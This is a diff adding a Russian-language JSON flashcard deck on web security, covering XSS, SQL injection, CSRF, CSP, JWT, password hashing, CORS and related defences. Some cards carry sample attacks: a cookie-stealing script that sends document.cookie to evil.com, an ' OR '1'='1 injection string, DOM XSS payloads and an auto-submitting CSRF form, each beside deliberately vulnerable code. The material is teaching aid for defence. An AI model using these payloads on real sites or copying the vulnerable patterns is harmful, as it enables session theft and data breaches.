@@ -1,0 +1,108 @@
+{
+  "id": "security",
+  "name": "Безопасность веб-приложений",
+  "topics": [
+    {
+      "id": "security_xss",
+      "title": "XSS и инъекции",
+      "cards": [
+        {
+          "term": "XSS",
+          "english": "Cross-Site Scripting (XSS)",
+          "russian": "XSS — атака, при которой злоумышленник внедряет вредоносный JavaScript-код в страницы, просматриваемые другими пользователями. Типы: Stored (сохранённый в БД), Reflected (в URL), DOM-based (модификация DOM). Последствия: кража cookies/session, keylogging, phishing. Защита: экранирование вывода, Content Security Policy, HttpOnly cookies, валидация ввода.",
+          "example": "// Уязвимый код (НЕ ДЕЛАЙТЕ ТАК!)\napp.get('/search', (req, res) => {\n  res.send(`<div>Results: ${req.query.q}</div>`);\n  // Атака: ?q=<script>fetch('https://evil.com?c='+document.cookie)</script>\n});\n\n// Защита: экранирование\nconst escapeHtml = (unsafe) => unsafe\n  .replace(/&/g, '&amp;')\n  .replace(/</g, '&lt;')\n  .replace(/>/g, '&gt;')\n  .replace(/\"/g, '&quot;')\n  .replace(/'/g, '&#039;');\n\nres.send(`<div>Results: ${escapeHtml(req.query.q)}</div>`);\n\n// Использование библиотеки (рекомендуется)\nconst DOMPurify = require('isomorphic-dompurify');\nconst clean = DOMPurify.sanitize(dirtyHtml);"
+        },
+        {
+          "term": "DOM-based XSS",
+          "english": "DOM-based XSS",
+          "russian": "DOM-based XSS возникает, когда JavaScript приложения небезопасно использует данные из источников, контролируемых пользователем (URL hash, localStorage, postMessage, document.referrer). В отличие от обычного XSS, код выполняется полностью на клиенте, без отправки на сервер. Опасные API: innerHTML, document.write, eval, setTimeout/setInterval с строкой, location.",
+          "example": "// Уязвимый код\n// URL: https://site.com#<img src=x onerror=alert(1)>\nconst hash = location.hash.slice(1);\nelement.innerHTML = hash; // XSS!\n\n// Ещё один пример\nconst id = new URLSearchParams(location.search).get('id');\neval(`loadData(${id})`); // Если id = '); alert(1); //\n\n// Безопасная альтернатива\nelement.textContent = userInput; // Не интерпретирует HTML\n\n// Для вставки HTML - использовать DOMPurify\nelement.innerHTML = DOMPurify.sanitize(userInput);\n\n// Никогда не использовать:\n// eval(), Function(), setTimeout(string), setInterval(string)\n// innerHTML с пользовательскими данными\n// location = userInput (open redirect)"
+        },
+        {
+          "term": "SQL Injection",
+          "english": "SQL Injection",
+          "russian": "SQL Injection — атака, при которой злоумышленник внедряет вредоносный SQL-код в запросы к базе данных. Позволяет читать, модифицировать или удалять данные, обходить аутентификацию. Защита: параметризованные запросы (prepared statements), ORM, валидация ввода, принцип least privilege для БД.",
+          "example": "// УЯЗВИМО! Никогда не конкатенируйте SQL\nconst query = `SELECT * FROM users WHERE id = '${userId}'`;\n// Атака: userId = \"' OR '1'='1\"\n// Результат: SELECT * FROM users WHERE id = '' OR '1'='1'\n// Получаем ВСЕХ пользователей!\n\n// БЕЗОПАСНО: параметризованные запросы\n// PostgreSQL\nconst query = 'SELECT * FROM users WHERE id = $1';\nawait db.query(query, [userId]);\n\n// MySQL\nconst query = 'SELECT * FROM users WHERE id = ?';\nawait db.query(query, [userId]);\n\n// ORM (Prisma, Sequelize)\nawait User.findOne({ where: { id: userId } });\n\n// NoSQL инъекции тоже существуют!\n// Уязвимо:\nUser.find({ where: { $ne: null } }) // если не валидировать"
+        },
+        {
+          "term": "CSRF",
+          "english": "Cross-Site Request Forgery",
+          "russian": "CSRF — атака, при которой злоумышленник заставляет аутентифицированного пользователя выполнить нежелательное действие на веб-сайте. Пользователь залогинен на bank.com, переходит на evil.com, который отправляет форму на bank.com/transfer. Браузер отправляет cookies, сервер думает что это легитимный запрос. Защита: CSRF-токены, SameSite cookies, проверка Origin/Referer.",
+          "example": "// Атака: evil.com имеет форму\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker_account\" />\n  <input name=\"amount\" value=\"10000\" />\n</form>\n<script>document.forms[0].submit()</script>\n\n// Защита 1: CSRF-токены\n// Сервер генерирует уникальный токен для сессии\n<form>\n  <input type=\"hidden\" name=\"csrf_token\" value=\"random-string\" />\n</form>\n// Сервер проверяет, что токен совпадает с сессией\n\n// Защита 2: SameSite cookies\nSet-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure\n// Strict - никогда не отправлять при cross-site запросах\n// Lax - отправлять только для top-level GET\n\n// Защита 3: Проверка заголовков\nconst origin = req.headers.origin;\nif (origin !== 'https://bank.com') {\n  return res.status(403).send('Forbidden');\n}"
+        },
+        {
+          "term": "Content Security Policy",
+          "english": "Content Security Policy (CSP)",
+          "russian": "CSP — HTTP-заголовок, позволяющий определить разрешённые источники для загрузки ресурсов (scripts, styles, images, fonts, API). Помогает защитить от XSS и data injection. Если ресурс не из разрешённого источника — браузер блокирует его. Режимы: enforced (блокировка) и report-only (только логирование).",
+          "example": "// HTTP-заголовок\nContent-Security-Policy: \n  default-src 'self';\n  script-src 'self' 'nonce-abc123' https://trusted.cdn.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com;\n  font-src 'self' https://fonts.gstatic.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n\n// Директивы:\n// 'self' - только с того же origin\n// 'none' - запретить полностью\n// 'unsafe-inline' - разрешить inline (осторожно!)\n// 'unsafe-eval' - разрешить eval() (осторожно!)\n// nonce-{value} - разрешить скрипт с этим nonce\n\n// В HTML:\n<script nonce=\"abc123\">\n  // Этот inline-скрипт разрешён CSP\n</script>"
+        },
+        {
+          "term": "HttpOnly Cookies",
+          "english": "HttpOnly Cookie Flag",
+          "russian": "Флаг HttpOnly запрещает JavaScript доступ к cookie через document.cookie. Cookie будет отправляться с HTTP-запросами, но недоступно для скриптов. Защищает от кражи session cookie через XSS. Обязательный флаг для сессионных токенов и JWT в cookies. Комбинируется с Secure (только HTTPS) и SameSite.",
+          "example": "// Установка cookie в Node.js/Express\nres.cookie('sessionId', 'abc123', {\n  httpOnly: true,    // Недоступно из JavaScript!\n  secure: true,      // Только HTTPS\n  sameSite: 'strict', // Защита от CSRF\n  maxAge: 3600000,   // Время жизни\n  domain: 'example.com',\n  path: '/'\n});\n\n// В JavaScript:\nconsole.log(document.cookie); \n// sessionId НЕ будет виден, даже при XSS!\n\n// Настройка для JWT\nres.cookie('jwt', token, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV === 'production',\n  sameSite: 'strict',\n  maxAge: 24 * 60 * 60 * 1000 // 1 день\n});\n\n// Доступ на сервере:\napp.get('/api/profile', (req, res) => {\n  const token = req.cookies.jwt; // Работает!\n  // ...\n});"
+        }
+      ]
+    },
+    {
+      "id": "security_auth",
+      "title": "Аутентификация и Авторизация",
+      "cards": [
+        {
+          "term": "JWT Security",
+          "english": "JSON Web Token Security",
+          "russian": "JWT (JSON Web Token) — токены для передачи claims между сторонами. Структура: header.payload.signature. Безопасность: никогда не хранить секретные данные в payload (только Base64), использовать короткий expiration, хранить в HttpOnly cookie (не localStorage!), реализовать refresh token rotation, добавить jti для отзыва токенов, проверять alg (защита от algorithm confusion).",
+          "example": "// Генерация JWT (Node.js)\nconst jwt = require('jsonwebtoken');\n\nconst token = jwt.sign(\n  { userId: user.id, role: user.role }, // payload\n  process.env.JWT_SECRET,               // секретный ключ\n  { expiresIn: '15m', algorithm: 'HS256' }\n);\n\n// Хранение: HttpOnly cookie (НЕ localStorage!)\n// localStorage уязвим для XSS\nres.cookie('jwt', token, { httpOnly: true, secure: true });\n\n// Верификация\ntry {\n  const decoded = jwt.verify(token, process.env.JWT_SECRET);\n} catch (err) {\n  // Token expired or invalid\n}\n\n// Refresh Token Rotation\n// При обновлении access token - генерируем новый refresh token\n// и инвалидируем старый (защита от replay attacks)\n\n// Отзыв токена (logout)\n// Добавляем jti (JWT ID) в blacklist (Redis) до expiration"
+        },
+        {
+          "term": "Password Hashing",
+          "english": "Password Hashing",
+          "russian": "Пароли НИКОГДА не хранятся в plaintext. Используются криптографические хэш-функции с солью. bcrypt — рекомендуемый алгоритм (adaptive, slow, resistant to rainbow tables). Argon2 — winner Password Hashing Competition. scrypt — memory-hard. НЕ использовать: MD5, SHA1 (быстрые, уязвимы к brute-force). cost factor (rounds) — чем больше, тем медленнее (bcrypt: 10-12).",
+          "example": "// bcrypt (Node.js)\nconst bcrypt = require('bcrypt');\nconst SALT_ROUNDS = 12; // 2^12 итераций\n\n// Хэширование при регистрации\nconst hashPassword = async (password) => {\n  const salt = await bcrypt.genSalt(SALT_ROUNDS);\n  const hash = await bcrypt.hash(password, salt);\n  // Сохраняем hash в БД\n  return hash;\n};\n\n// Проверка при логине\nconst verifyPassword = async (password, hash) => {\n  return await bcrypt.compare(password, hash);\n};\n\n// Argon2 (более современный)\nconst argon2 = require('argon2');\nconst hash = await argon2.hash(password, {\n  type: argon2.argon2id,\n  memoryCost: 65536, // 64MB\n  timeCost: 3,\n  parallelism: 4\n});\nconst valid = await argon2.verify(hash, password);\n\n// НИКОГДА:\n// SHA256(password) - быстро, уязвимо!\n// MD5 - взламывается за секунды"
+        },
+        {
+          "term": "Rate Limiting",
+          "english": "Rate Limiting",
+          "russian": "Ограничение количества запросов с одного IP/пользователя за определённое время. Защищает от brute-force атак (подбор паролей), DoS, scraping. Алгоритмы: Fixed Window, Sliding Window, Token Bucket. HTTP заголовки: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset. Retry-After при превышении лимита.",
+          "example": "// Express-rate-limit\nconst rateLimit = require('express-rate-limit');\n\n// Общий лимит\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 минут\n  max: 100, // макс 100 запросов\n  message: 'Too many requests from this IP',\n  standardHeaders: true, // Return rate limit info\n  legacyHeaders: false,  // Disable X-RateLimit\n});\napp.use(limiter);\n\n// Строгий лимит для логина\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5, // 5 попыток логина\n  skipSuccessfulRequests: true // Считать только неудачные\n});\napp.use('/api/login', loginLimiter);\n\n// Redis-based (для кластеров)\nconst RedisStore = require('rate-limit-redis');\nconst limiter = rateLimit({\n  store: new RedisStore({ client: redisClient }),\n  // ...\n});"
+        },
+        {
+          "term": "CORS Security",
+          "english": "Cross-Origin Resource Sharing Security",
+          "russian": "CORS — механизм безопасности браузера, контролирующий доступ к ресурсам с другого origin (домен, протокол, порт). Браузер отправляет preflight OPTIONS запрос для сложных запросов. Сервер отвечает Access-Control-Allow-Origin и другими заголовками. Опасно: Access-Control-Allow-Origin: * с credentials. Нужно: явное указание разрешённых origins, проверка Origin сервером.",
+          "example": "// НЕБЕЗОПАСНО (разрешает всё!)\nres.setHeader('Access-Control-Allow-Origin', '*');\nres.setHeader('Access-Control-Allow-Credentials', 'true');\n// Любой сайт может делать запросы от имени пользователя!\n\n// БЕЗОПАСНО\nconst allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];\n\napp.use(cors({\n  origin: function (origin, callback) {\n    // origin === undefined для same-origin запросов\n    if (!origin || allowedOrigins.indexOf(origin) !== -1) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true, // Разрешить cookies\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));\n\n// Preflight request\n// Browser отправляет OPTIONS перед POST/PUT/PATCH с custom headers\n// Сервер должен ответить 200 с разрешёнными методами"
+        }
+      ]
+    },
+    {
+      "id": "security_practices",
+      "title": "Security Best Practices",
+      "cards": [
+        {
+          "term": "Input Validation",
+          "english": "Input Validation",
+          "russian": "Валидация входных данных — первая линия обороны. Никогда не доверяйте данным от клиента. Валидировать: тип, формат, длину, диапазон значений. Использовать схемы (Joi, Yup, Zod, class-validator). Sanitization — очистка опасных символов. Валидация на клиенте — для UX, на сервере — для безопасности.",
+          "example": "// Zod (TypeScript-first validation)\nimport { z } from 'zod';\n\nconst userSchema = z.object({\n  email: z.string().email(),\n  age: z.number().int().min(0).max(150),\n  role: z.enum(['user', 'admin']),\n  username: z.string().min(3).max(20).regex(/^[a-zA-Z0-9_]+$/),\n});\n\napp.post('/register', (req, res) => {\n  const result = userSchema.safeParse(req.body);\n  if (!result.success) {\n    return res.status(400).json({\n      errors: result.error.issues\n    });\n  }\n  // Теперь result.data типобезопасна!\n});\n\n// Joi (JavaScript)\nconst Joi = require('joi');\nconst schema = Joi.object({\n  email: Joi.string().email().required(),\n  password: Joi.string().min(8).pattern(/[A-Z]/).required()\n});\n\nconst { error, value } = schema.validate(req.body);\nif (error) return res.status(400).send(error.details[0].message);"
+        },
+        {
+          "term": "HTTPS and TLS",
+          "english": "HTTPS and Transport Layer Security",
+          "russian": "HTTPS (HTTP over TLS/SSL) шифрует трафик между клиентом и сервером. Защищает от MITM (Man-in-the-Middle), перехвата cookies/токенов, подмены контента. HSTS (HTTP Strict Transport Security) — заставляет браузер всегда использовать HTTPS. Certificate Pinning — привязка приложения к конкретному сертификату. Нельзя: передавать credentials по HTTP, mixed content (HTTPS страница загружает HTTP ресурсы).",
+          "example": "// HSTS заголовок\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n// max-age - время кэширования (1 год)\n// includeSubDomains - применять к поддоменам\n// preload - включить в список браузеров\n\n// Express: форсировать HTTPS\napp.use((req, res, next) => {\n  if (req.header('x-forwarded-proto') !== 'https') {\n    res.redirect(`https://${req.header('host')}${req.url}`);\n  } else {\n  next();\n  }\n});\n\n// Secure cookie flag\nSet-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict\n// Secure - отправлять только по HTTPS\n\n// Certificate pinning (mobile apps)\n// Проверка, что сертификат совпадает с ожидаемым\n// Защита от rogue CAs"
+        },
+        {
+          "term": "Dependency Security",
+          "english": "Dependency Security",
+          "russian": "Уязвимости в зависимостях (npm packages) — один из главных векторов атак. Проверять уязвимости: npm audit, Snyk, GitHub Dependabot. Обновлять зависимости регулярно. Lock files (package-lock.json) — фиксируют версии для воспроизводимости. Проверять лицензии. Минимизировать количество зависимостей (supply chain attacks). Event Stream incident (2018) — скомпрометированный npm пакет.",
+          "example": "// Проверка уязвимостей\nnpm audit\nnpm audit fix\n\n// Выход с ошибкой если high/critical уязвимости\nnpm audit --audit-level=high\n\n// .snyk файл для исключений\n// Snyk CLI\nnpx snyk test\nnpx snyk wizard\n\n// GitHub Dependabot\n// .github/dependabot.yml\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n\n// package.json - скрипт для CI\n\"scripts\": {\n  \"security:check\": \"npm audit --audit-level=high\"\n}\n\n// Lock files - ВАЖНО коммитить!\n// package-lock.json или yarn.lock\n// Гарантирует воспроизводимость установок"
+        },
+        {
+          "term": "Clickjacking",
+          "english": "Clickjacking",
+          "russian": "Clickjacking (UI Redressing) — атака, при которой вредоносный сайт оборачивает ваш сайт в iframe и обманывает пользователя, заставляя кликнуть на замаскированную кнопку (например, 'Выиграй приз', которая на самом деле нажимает 'Удалить аккаунт'). Защита: X-Frame-Options заголовок (DENY, SAMEORIGIN) или CSP frame-ancestors.",
+          "example": "// Заголовок X-Frame-Options\nX-Frame-Options: DENY\n// Страница нельзя встроить во фрейм\n\nX-Frame-Options: SAMEORIGIN\n// Разрешено только на том же origin\n\n// CSP (современный способ)\nContent-Security-Policy: frame-ancestors 'none';\n// Полный запрет\n\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com;\n// Разрешить себя и trusted.com\n\n// JavaScript защита (базовая)\nif (window.top !== window.self) {\n  window.top.location = window.self.location;\n  // Или\n  // document.body.style.display = 'none';\n}\n\n// Проверка в DevTools:\n// Может ли ваш сайт быть открыт в iframe?"
+        }
+      ]
+    }
+  ]
+}
